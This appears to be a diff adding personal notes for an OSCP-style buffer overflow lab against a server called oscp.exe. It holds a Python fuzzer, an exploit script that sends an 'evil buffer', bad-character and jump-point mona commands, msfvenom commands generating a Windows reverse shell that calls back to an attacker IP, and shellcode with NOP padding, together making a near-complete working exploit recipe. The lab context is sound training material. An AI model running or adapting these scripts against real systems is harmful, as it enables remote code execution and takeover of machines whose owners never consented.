@@ -1,0 +1,98 @@
+Simple overflow py code:
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "10.10.140.28"
+
+port = 1337
+timeout = 5
+prefix = "OVERFLOW1 "
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
+  
+  
+Crash replication & controlling EIP:
+import socket
+
+ip = "10.10.140.28"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+  
+Creating bad chars using python:
+for x in range(1, 256):
+  print("\\x" + "{:02x}".format(x), end='')
+print()
+
+The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:
+
+!mona findmsp -distance 600
+
+Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).
+
+Finding Bad Characters
+!mona bytearray -b "\x00"
+after that 
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+
+
+Finding a Jump Point
+!mona jmp -r esp -cpb "\x00"
+
+Generate Payload
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.139.118 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+
+Generate Payload
+
+Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
+
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+
+Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
+
+payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
+"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
+...
+"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
+"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
+
+
+Prepend NOPs
+
+Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
+
+padding = "\x90" * 16
